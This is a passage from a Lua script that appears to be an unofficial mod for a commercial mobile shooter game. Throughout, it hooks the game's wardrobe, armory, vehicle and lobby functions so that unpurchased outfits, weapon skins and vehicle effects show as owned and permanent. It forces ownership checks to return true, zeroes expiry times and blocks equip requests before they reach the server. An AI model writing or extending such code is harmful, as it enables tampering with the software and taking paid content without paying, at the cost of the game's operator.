    if F.patchSelfWearCache(forceRefresh) then
        F.requestSocialAvatarRefresh()
    end
end

function F.buildLocalRoleDataForCoupleAvatar()
    local key = F.wearPatchKey()
    if SOCIAL.fullSnapshot and SOCIAL.snapshotKey == key then
        return SOCIAL.fullSnapshot
    end
    F.syncWeaponCacheFromLobby()
    local cch = F.cache()
    local ad = DataMgr.avatarData or {}
    local gender = tonumber(ad.gamegender) or 2
    if gender < 1 then gender = 2 end

    local data = {
        uid = DataMgr.roleData.uid,
        gender = gender,
        bshow = true,
        pspace_wear_ext = {
            [ENUM_AVATAR_SHOW_TYPE.SHOW_POS_HEAD] = { tonumber(ad.headid) or 401993, 0, 0 },
            [ENUM_AVATAR_SHOW_TYPE.SHOW_POS_HAIR] = { tonumber(ad.hairid) or 40601001, 0, 0 },
            [ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPON] = { 0, 0, 0 },
            [ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPONSKIN] = { 0, 0, 0 },
        },
        depot_show_info = {
            weapon = true, social_weapon = true, idle = true,
            helmet = true, bag = true, vehicle = true, hand = true,
        },
    }

    local outfitRes = F.resolveLobbyOutfitRes()
    if outfitRes and outfitRes > 0 then
        data.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_CLOTH] = { outfitRes, 0, 0 }
    end

    local skinRes = F.resolveLobbyWeaponSkinRes()
    if skinRes and skinRes > 0 then
        data.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPON][1] = 0
        data.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPONSKIN][1] = skinRes
    end
    data.depot_show_info = F.syncDepotShowWeaponFlags(data.depot_show_info)
    SOCIAL.fullSnapshot = data
    SOCIAL.snapshotKey = F.wearPatchKey()
    return data
end

local _myUidCached
function F.isMyWearData(wearData)
    if not wearData then return false end
    if not _myUidCached then
        pcall(function() _myUidCached = tonumber(DataMgr.roleData.uid) end)
    end
    return _myUidCached and tonumber(wearData.uid) == _myUidCached
end

function F.mergeInjectedWeaponIntoWearData(wearData)
    if not F.isMyWearData(wearData) then return end
    local skinRes = F.resolveLobbyWeaponSkinRes()
    wearData.depot_show_info = F.syncDepotShowWeaponFlags(wearData.depot_show_info)
    if not skinRes or skinRes <= 0 then return end
    wearData.mainWeaponInfo = wearData.mainWeaponInfo or {
        weaponResId = 0, weaponSkinId = 0,
        diyInfo = { diyWeaponId = 0, diyDefaultScheme = false, diyScheme = nil },
    }
    if wearData.mainWeaponInfo.weaponSkinId == skinRes
        and (tonumber(wearData.mainWeaponInfo.weaponResId) or 0) == 0 then
        return
    end
    wearData.mainWeaponInfo.weaponSkinId = skinRes
    wearData.mainWeaponInfo.weaponResId = 0
end

function F.equipSocialHandWeapon(avatar, skinRes)
    if not avatar or not skinRes or skinRes <= 0 then return end
    if SOCIAL.lastHandSkin == skinRes then return end
    SOCIAL.lastHandSkin = skinRes
    pcall(function()
        avatar:PutonEquipment(skinRes, nil, { bIsUse = true })
    end)
end

function F.shouldShowHandWeapon()
    local show = true
    pcall(function()
        local lds = require("client.slua.logic.wardrobe.logic_display_setting")
        if lds.data and lds.data.OpenGun ~= nil then
            show = lds.data.OpenGun ~= false
        end
    end)
    return show
end

function F.mergeInjectedOutfitIntoWearData(wearData)
    if not F.isMyWearData(wearData) then return end
    local outfitRes = F.resolveLobbyOutfitRes()
    if not outfitRes or outfitRes <= 0 then return end
    F.rememberLobbyOutfitRes(outfitRes)
    local AvatarData = require("client.logic.data.AvatarData")
    local converted = AvatarData.ConvertToAvatarCustom({ outfitRes, 0, 0 })
    if not converted then return end
    wearData.WearInfoList = wearData.WearInfoList or {}
    local replaced = false
    for i, e in ipairs(wearData.WearInfoList) do
        if e and e.ItemID and F.isSuitRes(e.ItemID) then
            wearData.WearInfoList[i] = converted
            replaced = true
            break
        end
    end
    if not replaced then
        table.insert(wearData.WearInfoList, converted)
    end
end

function F.mergeInjectedIntoWearData(wearData)
    if not wearData then return end
    F.mergeInjectedWeaponIntoWearData(wearData)
    F.mergeInjectedOutfitIntoWearData(wearData)
end

function F.reapplyLobbyEquipped()
    if not GameStatus or not GameStatus.IsInLobbyOrMainCity or not GameStatus.IsInLobbyOrMainCity() then
        return
    end
    F.syncWeaponCacheFromLobby()
    F.applyPersistSlotsToCache()
    local curPage = F.getLobbyCurPage()

    if ENUM_LobbyPageType and curPage == ENUM_LobbyPageType.Left then
        F.onSocialWearDirty(true)
        return
    end

    local cch = F.cache()
    if cch.outfitIns and F.isInjectedIns(cch.outfitIns) then
        F.putOnOutfit(cch.outfitIns)
    end
    if cch.hatIns and F.isInjectedIns(cch.hatIns) then
        F.putOnHat(cch.hatIns)
    end
    if cch.maskIns and F.isInjectedIns(cch.maskIns) then
        F.putOnRoleWear(cch.maskIns)
    end
    if cch.glassIns and F.isInjectedIns(cch.glassIns) then
        F.putOnRoleWear(cch.glassIns)
    end
    if cch.tshirtIns and F.isInjectedIns(cch.tshirtIns) then
        F.putOnRoleWear(cch.tshirtIns)
    end
    if cch.pantsIns and F.isInjectedIns(cch.pantsIns) then
        F.putOnRoleWear(cch.pantsIns)
    end
    if cch.shoesIns and F.isInjectedIns(cch.shoesIns) then
        F.putOnRoleWear(cch.shoesIns)
    end
    if cch.bagIns and F.isInjectedIns(cch.bagIns) then
        F.putOnRoleWear(cch.bagIns)
    end
    if cch.helmetIns and F.isInjectedIns(cch.helmetIns) then
        F.putOnRoleWear(cch.helmetIns)
    end
    if cch.parachuteIns then
        F.putOnParachute(cch.parachuteIns)
    end
    if cch.gliderIns then
        F.putOnGlider(cch.gliderIns)
    end
    if cch.glovesIns and F.isInjectedIns(cch.glovesIns) then
        F.putOnGloves(cch.glovesIns)
    end

    local mainWid = tonumber(DataMgr.Weapon_ID) or 0
    local w = mainWid > 0 and cch.weapons[mainWid] or nil
    if w and w.resID and w.resID > 0 then
        if w.insID and F.isInjectedIns(w.insID) then
            F.equipWeaponSkin(mainWid, w.insID)
        else
            pcall(function() DataMgr.InitWeaponData(mainWid, w.resID, w.insID or 0) end)
        end
    end

    pcall(function()
        local uid = tostring(DataMgr.roleData.uid)
        local LAM = require("client.logic.avatar.LobbyAvatarManager")
        local TAM = require("client.logic.avatar.logic_team_avatar_manager")
        if w and w.resID and w.resID > 0 and TAM.GetAvatarByUid(uid) then
            LAM.EquipWeapon(uid, { weaponId = mainWid, skinId = w.resID }, nil, true)
        end
    end)

    F.reapplyVehicleSlotsFromConfig(true)
    F.reapplyHallThemeFromConfig(true)
    F.reapplyWeaponsFromConfig()
    pcall(F.applyVehicleSkinsToPC)
end

F.scheduleLobbyReapplyOnce = function()
    if LOBBY.reapplyDone or LOBBY.reapplyScheduled then return end
    LOBBY.reapplyScheduled = true
    F.later(2.0, function()
        LOBBY.reapplyScheduled = false
        if LOBBY.reapplyDone then return end
        LOBBY.reapplyDone = true
        F.reapplyLobbyEquipped()
    end)
end

function F.hookLobbySwipePersistence()
    if _G.AddOutfitLobbySwipeHooked then return end
    _G.AddOutfitLobbySwipeHooked = true
    pcall(function()
        local BD = ModuleManager.GetModule(ModuleManager.DataModuleConfig.BasicDataAvatarWearInfo)
        local oRsp = BD.on_get_avatar_show_rsp
        BD.on_get_avatar_show_rsp = function(self, res, target_uid, data)
            oRsp(self, res, target_uid, data)
                if tonumber(target_uid) == tonumber(DataMgr.roleData.uid) then
                F.patchSelfWearCache(true)
                SOCIAL.forceAvatarRedraw = true
                SOCIAL.lastHandSkin = nil
                if ENUM_LobbyPageType and F.getLobbyCurPage() == ENUM_LobbyPageType.Left then
                    F.requestSocialAvatarRefresh()
                end
            end
        end
    end)

    pcall(function()
        local AC = require("client.slua.logic.avatar.avatar_common")
        local oGetWear = AC.GetWearDataFromRoleData
        AC.GetWearDataFromRoleData = function(roleData)
            local wearData = oGetWear(roleData)
            if wearData and roleData and tonumber(roleData.uid) == tonumber(DataMgr.roleData.uid)
                and F.isLobbyLeftPage() then
                F.mergeInjectedIntoWearData(wearData)
            end
            return wearData
        end
        local oUp = AC.UpdateAvatar
        AC.UpdateAvatar = function(avatar, wearData, isShowWeapon, isShowHelmet, isShowBag)
            if F.isMyWearData(wearData) and F.isLobbyLeftPage() then
                F.mergeInjectedIntoWearData(wearData)
            end
            local showGun = isShowWeapon and F.shouldShowHandWeapon()
            if wearData and wearData.depot_show_info then
                showGun = showGun and wearData.depot_show_info.weapon ~= false
            end
            if F.isMyWearData(wearData) and F.isLobbyLeftPage() then
                for _, e in ipairs(wearData.WearInfoList or {}) do
                    if e and e.ItemID and F.isInjectedRes(e.ItemID) and F.isSuitRes(e.ItemID) then
                        F.rememberLobbyOutfitRes(e.ItemID)
                        break
                    end
                end
            end
            local ret = oUp(avatar, wearData, showGun, isShowHelmet, isShowBag)
            if showGun and F.isMyWearData(wearData) and avatar and F.isLobbyLeftPage() then
                local skin = tonumber(wearData.mainWeaponInfo and wearData.mainWeaponInfo.weaponSkinId) or 0
                if skin <= 0 then skin = F.resolveLobbyWeaponSkinRes() or 0 end
                if skin > 0 then F.equipSocialHandWeapon(avatar, skin) end
            end
            return ret
        end
    end)

    pcall(function()
        local CA = require("client.logic.avatar.CoupleAvatar")
        local Cfg = require("client.slua.logic.lobby.Left.CoupleAvatarConfig")
        local oMulti = CA._UpdateMultiAvatar
        if oMulti then
            CA._UpdateMultiAvatar = function(self, avatar, avatarType)
                local isSelf = avatarType == Cfg.AvatarType.Self
                    and self.SelfUID and tostring(self.SelfUID) == tostring(DataMgr.roleData.uid)
                if isSelf and F.isLobbyLeftPage() then
                    pcall(function()
                        local BD = ModuleManager.GetModule(ModuleManager.DataModuleConfig.BasicDataAvatarWearInfo)
                        local d = BD:GetCacheData(tonumber(self.SelfUID))
                        if d then F.applyInjectedPspace(d) end
                    end)
                    if SOCIAL.forceAvatarRedraw then
                        self.CompareDataCache[avatarType] = nil
                        SOCIAL.forceAvatarRedraw = nil
                    end
                end
                oMulti(self, avatar, avatarType)
                if isSelf and F.isLobbyLeftPage() and self.isShowWeapon ~= false and F.shouldShowHandWeapon() then
                    local skin = F.resolveLobbyWeaponSkinRes()
                    if skin and skin > 0 then F.equipSocialHandWeapon(avatar, skin) end
                end
            end
        end
        local oHideCheck = CA.CheckSelfIsHideAvatar
        CA.CheckSelfIsHideAvatar = function(self, nSelfUId, tRoleData)
            if F.isLobbyLeftPage() and tostring(nSelfUId) == tostring(DataMgr.roleData.uid) then
                return false
            end
            return oHideCheck(self, nSelfUId, tRoleData)
        end

        local oUpdate = CA.Update
        CA.Update = function(self)
            if not F.isLobbyLeftPage() then
                return oUpdate(self)
            end
            local isSelf = self.SelfUID and tostring(self.SelfUID) == tostring(DataMgr.roleData.uid)
            local oHide = CA.HideAvatars
            if isSelf then
                CA.HideAvatars = function() end
            end
            local ok, err = pcall(oUpdate, self)
            CA.HideAvatars = oHide
        end

        local oRecv = CA.OnReceiveData
        CA.OnReceiveData = function(self, uid, data)
            if F.isLobbyLeftPage() and uid == self.SelfUID and tostring(uid) == tostring(DataMgr.roleData.uid) then
                if data then
                    F.applyInjectedPspace(data)
                else
                    data = F.buildLocalRoleDataForCoupleAvatar()
                end
            end
            return oRecv(self, uid, data)
        end
    end)

    pcall(function()
        if not EventSystem or not EventSystem.registEvent then return end
        if EVENTTYPE_LOBBY and EVENTID_SWITCHTO_PAGE_START then
            EventSystem:registEvent(EVENTTYPE_LOBBY, EVENTID_SWITCHTO_PAGE_START, function(_, _, toPage)
                if ENUM_LobbyPageType and toPage == ENUM_LobbyPageType.Left then
                    F.syncWeaponCacheFromLobby()
                    SOCIAL.lastHandSkin = nil
                    local o = F.resolveLobbyOutfitRes()
                    if o then F.rememberLobbyOutfitRes(o) end
                    F.patchSelfWearCache(true)
                    SOCIAL.forceAvatarRedraw = true
                end
            end)
        end
        if EVENTTYPE_LOBBY and EVENTID_SWITCHTO_PAGE_END then
            EventSystem:registEvent(EVENTTYPE_LOBBY, EVENTID_SWITCHTO_PAGE_END, function(_, _, _, toPage)
                if ENUM_LobbyPageType and toPage == ENUM_LobbyPageType.Left then
                    F.syncWeaponCacheFromLobby()
                    SOCIAL.lastHandSkin = nil
                    F.socialDebounce(0.45, function()
                        F.onSocialWearDirty(true)
                    end)
                elseif ENUM_LobbyPageType and toPage == ENUM_LobbyPageType.Mid then
                    SOCIAL.wearPatchKey = nil
                    F.invalidateLobbyResolved()
                    if not LOBBY.reapplyDone then
                        F.socialDebounce(0.5, F.scheduleLobbyReapplyOnce)
                    end
                end
            end)
        end
        if EVENTTYPE_LOBBY_SOCIAL and EVENTID_GOT_SOCIAL_LOBBY_SHOW_DATA then
            EventSystem:registEvent(EVENTTYPE_LOBBY_SOCIAL, EVENTID_GOT_SOCIAL_LOBBY_SHOW_DATA, function(_, _, nUId)
                if tonumber(nUId) == tonumber(DataMgr.roleData.uid) then
                    F.socialDebounce(0.2, function() F.patchSelfWearCache(false) end)
                end
            end)
        end
        if EVENTTYPE_WARDROBE and EVENTID_WARDROBE_UPDATE_CURRENT_PUT_ON_GUN then
            EventSystem:registEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_CURRENT_PUT_ON_GUN, function()
                SOCIAL.wearPatchKey = nil
                SOCIAL.snapshotKey = nil
                F.syncWeaponCacheFromLobby()
                
                local curPage = ENUM_LobbyPageType and F.getLobbyCurPage()
                if curPage == ENUM_LobbyPageType.Left then
                    F.socialDebounce(0.25, function() F.onSocialWearDirty(true) end)
                end
                
                -- [FIX VIP] Otomatis pasang ulang Skin Mod saat game ada indikasi update senjata di lobi
                F.socialDebounce(0.3, function()
                    if F.reapplyLobbyEquipped then F.reapplyLobbyEquipped() end
                end)
            end)
        end
    end)

    pcall(function()
        local lds = require("client.slua.logic.wardrobe.logic_display_setting")
        local oSwitch = lds.SwitchGun
        lds.SwitchGun = function(...)
            local r = oSwitch(...)
            SOCIAL.wearPatchKey = nil
            
            local curPage = ENUM_LobbyPageType and F.getLobbyCurPage()
            if curPage == ENUM_LobbyPageType.Left then
                F.socialDebounce(0.2, function() F.onSocialWearDirty(true) end)
            end
            
            -- [FIX VIP] Saat Klik pada slot senjata di Lobi, tunggu game ganti senjata asli selesai lalu 0.3s kemudian pasang skin Mod kembali
            F.socialDebounce(0.3, function()
                if F.reapplyLobbyEquipped then F.reapplyLobbyEquipped() end
            end)
            
            return r
        end
    end)
end

function F.hookDepotInit()
    pcall(function()
        local WDE = require("client.slua.logic.wardrobe.WardrobeDataEntity")
        if WDE._AddOutfitInitHooked then return end
        WDE._AddOutfitInitHooked = true
        local orig = WDE.InitData
        WDE.InitData = function(self, pkg)
            orig(self, pkg)
            _G.AddOutfitUnexpireDone = false
            pcall(function()
                if F.injectAll(self) then
                    F.scheduleInjectRefresh()
                    LOBBY.reapplyDone = false
                    LOBBY.reapplyScheduled = false
                    F.scheduleLobbyReapplyOnce()
                end
            end)
        end
    end)
end

function F.hookWardrobeData()
    pcall(function()
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        if wd._AddOutfitDataHooked then return end
        wd._AddOutfitDataHooked = true
        local function wrapGet(name)
            local o = wd[name]
            if not o then return end
            wd[name] = function(self, insID, ...)
                insID = tonumber(insID)
                local r
                if F.isInjectedIns(insID) then
                    local e = F.getEntity()
                    if e then r = e:GetDataByInsID(insID) end
                else
                    r = o(self, insID, ...)
                end
                if r and (F.isInjectedIns(insID) or F.isInjectedRes(r.resID or r.res_id)) then
                    r.expire_ts = 0
                    r.expireTS = 0
                    r.valid_hours = 0
                end
                return r
            end
        end
        wrapGet("GetHallDepotItemDataByInsID")
        wrapGet("GetValidHallDepotItemDataByInsID")
        local function wrapBool(name)
            local o = wd[name]
            if not o then return end
            wd[name] = function(self, id, ...)
                if F.isInjectedRes(tonumber(id)) or F.isInjectedIns(tonumber(id)) then return true end
                return o(self, id, ...)
            end
        end
        wrapBool("HasItem")
        wrapBool("HasValidItem")
        wrapBool("CheckHasPermanentItem")
    end)
end

function F.hookPageFilter()
    pcall(function()
        local wl = require("client.slua.logic.wardrobe.logic_wardrobe_new")
        if wl._AddOutfitPageFilterHooked then return end
        wl._AddOutfitPageFilterHooked = true
        local o1 = wl.IsValidCurrentPageItem
        wl.IsValidCurrentPageItem = function(self, mainTab, subTab, v, t)
            if v and F.isInjectedRes(v.resID) then
                local itemTab = tonumber(v.subTabType) or F.wardrobeTab(v.resID)
                if itemTab and itemTab == subTab then
                    if mainTab == PAGE_AVATAR or mainTab == PAGE_VEHICLE then return true end
                    if mainTab == PAGE_PARACHUTE and F.isHallThemeRes(v.resID) then return true end
                end
            end
            return o1(self, mainTab, subTab, v, t)
        end
        local o2 = wl.IsCanUse
        wl.IsCanUse = function(self, resId)
            if F.isInjectedRes(resId) then return true end
            return o2(self, resId)
        end
        local o3 = wl.IsCharacterUse
        wl.IsCharacterUse = function(self, resId)
            if F.isInjectedRes(resId) then return true end
            return o3(self, resId)
        end
        local o4 = wl.GetWardrobeInsIdByResId
        wl.GetWardrobeInsIdByResId = function(self, resid)
            resid = tonumber(resid)
            if F.isInjectedRes(resid) then return R.resToIns[resid] end
            return o4(self, resid)
        end
    end)
end

function F.hookArmory()
    pcall(function()
        local Arm = require("client.logic.armory.logic_armory")
        if Arm._AddOutfitArmoryHooked then return end
        Arm._AddOutfitArmoryHooked = true
        local oa = Arm.get_weapon_skin_list_rsp
        Arm.get_weapon_skin_list_rsp = function(a, b, c, d)
            oa(a, b, c, d)
            F.mergeInjectedArmorySkins()
        end
        local oi = Arm.install_weapon_skin
        Arm.install_weapon_skin = function(cd, wid, ins)
            ins = tonumber(ins)
            if F.isWeaponSkinIns(ins) then
                wid = tonumber(F.weaponIdFromSkin(R.insToRes[ins]) or wid)
                F.equipWeaponSkin(wid, ins)
                return
            end
            return oi(cd, wid, ins)
        end
    end)
    pcall(function()
        local AH = require("client.network.Protocol.ArmoryHandler")
        if AH._AddOutfitArmorySendHooked then return end
        AH._AddOutfitArmorySendHooked = true
        local o = AH.send_install_weapon_skin
        AH.send_install_weapon_skin = function(cd, wid, ins)
            ins = tonumber(ins)
            if F.isWeaponSkinIns(ins) then
                wid = tonumber(F.weaponIdFromSkin(R.insToRes[ins]) or wid)
                F.equipWeaponSkin(wid, ins)
                return
            end
            return o(cd, wid, ins)
        end
    end)
end

function F.hookGunSkinId()
    pcall(function()
        local wgl = require("client.slua.logic.wardrobe.logic_wardrobe_gun")
        if wgl._AddOutfitGunSkinHooked then return end
        wgl._AddOutfitGunSkinHooked = true
        local o = wgl.GetSkinIdByWeaponID
        wgl.GetSkinIdByWeaponID = function(self, wid)
            local c = F.cache()
            local w = c.weapons[wid]
            if w and F.isWeaponSkinIns(w.insID) then return w.insID end
            local Arm = require("client.logic.armory.logic_armory")
            if Arm.rsp_list and Arm.rsp_list.install_list and Arm.rsp_list.install_list[wid] then
                local sid = Arm.rsp_list.install_list[wid].skin_id
                if sid and F.isWeaponSkinIns(sid) then return sid end
            end
            return o(self, wid)
        end
    end)
end

function F.hookPutOn()
    pcall(function()
        local WRH = require("client.network.Protocol.WardRobeHandler")
        if WRH._AddOutfitPutOnHooked then return end
        WRH._AddOutfitPutOnHooked = true
        local o = WRH.send_depot_put_on_req
        WRH.send_depot_put_on_req = function(insID, extra)
            insID = tonumber(insID)
            if F.tryLocalWearByIns(insID) then return end
            return o(insID, extra)
        end
    end)
end

function F.hookPutDown()
    pcall(function()
        local WRH = require("client.network.Protocol.WardRobeHandler")
        if WRH._AddOutfitPutDownHooked then return end
        WRH._AddOutfitPutDownHooked = true
        local o = WRH.send_depot_put_down_req
        WRH.send_depot_put_down_req = function(insID)
            if F.isInjectedIns(tonumber(insID)) then
                F.takeOffInjected(insID)
                return
            end
            return o(insID)
        end
        local ob = WRH.send_depot_batch_put_down_req
        WRH.send_depot_batch_put_down_req = function(instid_list)
            local rest = {}
            for _, id in ipairs(instid_list or {}) do
                if F.isInjectedIns(tonumber(id)) then
                    F.takeOffInjected(id)
                else
                    rest[#rest + 1] = id
                end
            end
            if #rest > 0 then return ob(rest) end
        end
    end)
end

function F.hookVehicleSwitchEffect()
    if _G.AddOutfitVehSwitchHooked then return end
    pcall(function()
        local VAC = require("GameLua.GameCore.Module.Vehicle.Component.VehicleAvatarComponent")
        local impl = VAC and VAC.__inner_impl
        if not impl or impl._AddOutfitVehSwitchHooked then return end
        impl._AddOutfitVehSwitchHooked = true

        if not _G.AddOutfitVehOrigCanSwitch then
            _G.AddOutfitVehOrigCanSwitch = impl.CheckCanPlaySkinSwitchEffect
        end
        impl.CheckCanPlaySkinSwitchEffect = function(self, curVehicleId, lastVehicleId)
            if self.IsLobbyActor and self:IsLobbyActor() then return false end
            if not F.isInRealMatch() then return false end
            return true
        end

        if not _G.AddOutfitVehOrigShowSwitch then
            _G.AddOutfitVehOrigShowSwitch = impl.ShowVehicleSwitchEffect
        end
        impl.ShowVehicleSwitchEffect = function(self)
            if self.IsLobbyActor and self:IsLobbyActor() then return false end
            if not F.isInRealMatch() then return false end
            if not self.curSwitchEffectId or self.curSwitchEffectId <= 0 then
                self.curSwitchEffectId = VEH_SWITCH_EFFECT_ID
            end
            local vehicleActor = self:GetOwner()
            if not slua.isValid(vehicleActor) then return false end
            if self.uSwitchEffectActor then
                self:StopSkinSwitchEffect()
                pcall(function() self.uSwitchEffectActor:K2_DestroyActor() end)
                self.uSwitchEffectActor = nil
            end
            if not self.lastEquipedAvatarId or self.lastEquipedAvatarId <= 0 then
                local defId = 0
                pcall(function() defId = self:GetDefaultAvatarID() or 0 end)
                self.lastEquipedAvatarId = vehicleActor.ClientUsedAvatarID or defId or 0
            end
            local currentAvatarID = vehicleActor.ClientUsedAvatarID or self.lastEquipedAvatarId or 0
            local bIsLobbyActor = self:IsLobbyActor()
            local world = slua_GameFrontendHUD:GetWorld()
            local VehiclePlateLicenseUtil = require("GameLua.Activity.Commercialize.GamePlay.Vehicle.VehiclePlateLicenseUtil")
            local SkinSwitchEffectActorPath = VehiclePlateLicenseUtil.GetSwitchEffectActorPath()
            local BP_DissolveVehicleClass = import(SkinSwitchEffectActorPath)
            self.uSwitchEffectActor = world:SpawnActor(BP_DissolveVehicleClass, nil, nil, nil)
            if not slua.isValid(self.uSwitchEffectActor) then
                self.uSwitchEffectActor = nil
                return false
            end
            self.uSwitchEffectActor:K2_AttachToActor(vehicleActor, "None", 1, 1, 1, false)
            self.uSwitchEffectActor:K2_SetActorRelativeLocation(FVector(0, 0, 0), false, nil, false)
            self.uSwitchEffectActor:K2_SetActorRelativeRotation(FRotator(0, 0, 0), false, nil, false)
            pcall(function() self:HideParticles() end)
            self:ChangeFakeSwitchVehicleAvatar(self.uSwitchEffectActor.Mesh, self.lastEquipedAvatarId)
            self.uSwitchEffectActor:SetAnimInsAndAnimState(self.uOldVehicleMeshAnimClass, vehicleActor)
            self.uSwitchEffectActor:StartVehicleSwitchEffect(
                vehicleActor, self.curSwitchEffectId, self.lastEquipedAvatarId, currentAvatarID, bIsLobbyActor)
            self.uOldVehicleMeshAnimClass = nil
            return true
        end

        if not _G.AddOutfitVehOrigBeginPlay then
            _G.AddOutfitVehOrigBeginPlay = impl.ReceiveBeginPlay
        end
        local oBegin = _G.AddOutfitVehOrigBeginPlay
        impl.ReceiveBeginPlay = function(self)
            oBegin(self)
            pcall(function()
                if self.uSwitchEffectActor then
                    self:StopSkinSwitchEffect()
                    pcall(function() self.uSwitchEffectActor:K2_DestroyActor() end)
                    self.uSwitchEffectActor = nil
                end
                self.lastEquipedAvatarId = 0
                if self.IsLobbyActor and self:IsLobbyActor() then
                    self.curSwitchEffectId = 0
                elseif F.isInRealMatch() then
                    self.curSwitchEffectId = VEH_SWITCH_EFFECT_ID
                else
                    self.curSwitchEffectId = 0
                end
            end)
        end

        if impl.LuaIsAssetsAlreadyAvailable and not _G.AddOutfitVehOrigAssets then
            _G.AddOutfitVehOrigAssets = impl.LuaIsAssetsAlreadyAvailable
            impl.LuaIsAssetsAlreadyAvailable = function(self, avatarId)
                if F.isVehicleSkinAllowed(tonumber(avatarId)) then return true end
                return _G.AddOutfitVehOrigAssets(self, avatarId)
            end
        end

        _G.AddOutfitVehSwitchHooked = true
    end)
end

function F.hookVehicleChassisLight()
    if _G.AddOutfitVehChassisHooked then return end
    pcall(function()
        local LIC = require("GameLua.Activity.Commercialize.Actor.ActorComponent.BP_VehicleLicenseComponentBase")
        if LIC and LIC.CheckHasVehicleDownloaded and not _G.AddOutfitVehOrigLicDownload then
            _G.AddOutfitVehOrigLicDownload = LIC.CheckHasVehicleDownloaded
            LIC.CheckHasVehicleDownloaded = function(self, itemID)
                local id = tonumber(itemID)
                if F.isVehicleSkinAllowed(id) or F.isChassisLightId(id) then return true end
                return _G.AddOutfitVehOrigLicDownload(self, itemID)
            end
        end
    end)
    pcall(function()
        local LVF = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.LogicVehicleExtendedFeature)
        if not LVF or LVF._AddOutfitChassisHooked then return end
        LVF._AddOutfitChassisHooked = true

        if not _G.AddOutfitVehOrigGetFeature then
            _G.AddOutfitVehOrigGetFeature = LVF.CheckHasGetFeatureItem
        end
        LVF.CheckHasGetFeatureItem = function(self, featureId)
            if F.isChassisLightId(featureId) then return true end
            return _G.AddOutfitVehOrigGetFeature(self, featureId)
        end

        if not _G.AddOutfitVehOrigEquippedFeature then
            _G.AddOutfitVehOrigEquippedFeature = LVF.CheckHasEquippedItem
        end
        LVF.CheckHasEquippedItem = function(self, featureId, vehicleId)
            -- [FIX VIP] Tambahkan pengecekan kondisi ModSkin
            if _G.LexusConfig and _G.LexusConfig.ModSkin ~= false then
                if F.isChassisLightId(featureId) then
                    return F.getDesiredChassisLight(vehicleId) == tonumber(featureId)
                end
            end
            return _G.AddOutfitVehOrigEquippedFeature(self, featureId, vehicleId)
        end

        if not _G.AddOutfitVehOrigEquipChassisData then
            _G.AddOutfitVehOrigEquipChassisData = LVF.GetEquipedChassisLightData
        end
        LVF.GetEquipedChassisLightData = function(self, vehicleId, source)
            -- [FIX VIP] Tambahkan pengecekan kondisi ModSkin
            if _G.LexusConfig and _G.LexusConfig.ModSkin ~= false then
                local our = F.getDesiredChassisLight(vehicleId)
                if our then return our end
            end
            return _G.AddOutfitVehOrigEquipChassisData(self, vehicleId, source)
        end

        if not _G.AddOutfitVehOrigChassisLightData then
            _G.AddOutfitVehOrigChassisLightData = LVF.GetVehicleChassisLightData
        end
        LVF.GetVehicleChassisLightData = function(self, uid, vehicleId, position, source)
            -- [FIX VIP] Tambahkan pengecekan kondisi ModSkin
            if _G.LexusConfig and _G.LexusConfig.ModSkin ~= false then
                if uid and DataMgr and DataMgr.roleData and tonumber(uid) == tonumber(DataMgr.roleData.uid) then
                    local our = F.getDesiredChassisLight(vehicleId)
                    if our then return our end
                end
            end
            return _G.AddOutfitVehOrigChassisLightData(self, uid, vehicleId, position, source)
        end

        if not _G.AddOutfitVehOrigPutOnFeature then
            _G.AddOutfitVehOrigPutOnFeature = LVF.PutOnVehicleFeature
        end
        LVF.PutOnVehicleFeature = function(self, featureId, vehicleId)
            featureId = tonumber(featureId)
            vehicleId = tonumber(vehicleId)
            if F.isChassisLightId(featureId) then
                F.saveChassisLight(vehicleId, featureId)
                self.equip_chassis_light = self.equip_chassis_light or {}
                if vehicleId and vehicleId > 0 then
                    self.equip_chassis_light[vehicleId] = featureId
                end
                return
            end
            return _G.AddOutfitVehOrigPutOnFeature(self, featureId, vehicleId)
        end

        if not _G.AddOutfitVehOrigPutOffFeature then
            _G.AddOutfitVehOrigPutOffFeature = LVF.PutOffVehicleFeature
        end
        LVF.PutOffVehicleFeature = function(self, featureId, vehicleId)
            featureId = tonumber(featureId)
            vehicleId = tonumber(vehicleId)
            if F.isChassisLightId(featureId) then
                PERSIST.configChassisLightMap = PERSIST.configChassisLightMap or {}
                if vehicleId and vehicleId > 0 then
                    PERSIST.configChassisLightMap[vehicleId] = nil
                end
                if self.equip_chassis_light and vehicleId then
                    self.equip_chassis_light[vehicleId] = nil
                end
                F.persistMarkDirty()
                return
            end
            return _G.AddOutfitVehOrigPutOffFeature(self, featureId, vehicleId)
        end
    end)
    _G.AddOutfitVehChassisHooked = true
end

function F.hookVehicles()
    F.hookVehicleSwitchEffect()
    F.hookVehicleChassisLight()
    pcall(function()
        local WV = require("client.slua.umg.Wardrobe.subtab_vehicles")
        if not WV or WV._AddOutfitVehClickHooked then return end
        WV._AddOutfitVehClickHooked = true
        local oClick = WV.ClickItem
        WV.ClickItem = function(self, vehicleSkin, bForceUsing)
            if vehicleSkin and F.isInjectedRes(vehicleSkin.res_id) then
                vehicleSkin.expireTS = 0
                vehicleSkin.expire_ts = 0
            end
            return oClick(self, vehicleSkin, bForceUsing)
        end
        local oDrop = WV.OnVehicleSlotDrop
        if oDrop then
            WV.OnVehicleSlotDrop = function(self, DragWidget, Index, DragDropData)
                pcall(function()
                    local ins = DragDropData and DragDropData.ins_id
                    if F.isInjectedIns(tonumber(ins)) then
                        F.ensureInjectedItemAlive(nil, nil, ins)
                    end
                end)
                return oDrop(self, DragWidget, Index, DragDropData)
            end
        end
    end)
    pcall(function()
        local WNH = require("client.network.Protocol.WardrobeNewHandler")
        if WNH._AddOutfitVehicleHooked then return end
        WNH._AddOutfitVehicleHooked = true
        local oMod = WNH.send_depot_modify_combat_vehicle_req
        WNH.send_depot_modify_combat_vehicle_req = function(instid, slot_index, ope_type)
            if F.modifyInjectedVehicleSlot(instid, slot_index, ope_type == true) then return end
            return oMod(instid, slot_index, ope_type)
        end
        local oRsp = WNH.on_depot_modify_combat_vehicle_rsp
        WNH.on_depot_modify_combat_vehicle_rsp = function(err_code, knapsack_vst)
